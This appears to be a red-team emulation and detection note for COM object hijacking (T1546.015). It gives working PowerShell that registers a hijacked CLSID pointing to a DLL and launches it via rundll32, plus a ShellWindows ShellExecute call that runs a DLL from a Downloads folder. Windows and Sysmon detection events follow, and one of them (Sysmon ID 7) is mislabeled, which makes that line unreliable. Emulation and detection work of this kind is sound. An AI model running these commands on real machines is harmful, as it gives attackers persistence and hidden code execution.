

Component Object Model Hijacking T1546.015

``` InprocServer32
New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}' -Value 'MSAA AccPropServices'
New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}\InprocServer32' -Value "C:\Users\Public\officetest.dll"
New-ItemProperty -Path 'HKCU:\SOFTWARE\Classes\CLSID\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}\InprocServer32' -Name 'ThreadingModel' -Value 'Apartment' -PropertyType "String"
Start-Process -FilePath "C:\Windows\System32\RUNDLL32.EXE" -ArgumentList '-sta {B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}'
```



```remove
Remove-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}' -Recurse -ErrorAction Ignore

```



```powershell
$o= [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39"))
$item = $o.Item()
$item.Document.Application.ShellExecute("cmd.exe","/c rundll32.exe C:\Users\soheil.SOHEIL\Downloads\check.dll,StartW","C:\windows\system32",$null,0)
```



Windows Event Viewer:

- Event ID 4657 (Windows Server 2008 and later): A registry value was modified, which could indicate the modification of a COM object reference.
    
- Event ID 4688 (Windows Server 2008 and later): A new process has been created, which could indicate the launch of a process related to hijacked COM objects.
    

Sysmon:

- Event ID 1 - Process creation: Monitor for the creation of processes related to malicious executables, unusual file names, or processes with unusual command-line arguments.
    
- Event ID 13 - Registry operation: Monitor for modifications to registry keys related to COM objects, such as HKEY_CLASSES_ROOT\CLSID and HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID.
    
- Event ID 7 - File system operations: Monitor for file creations, modifications, or deletions related to hijacked COM objects or suspicious files associated with this technique.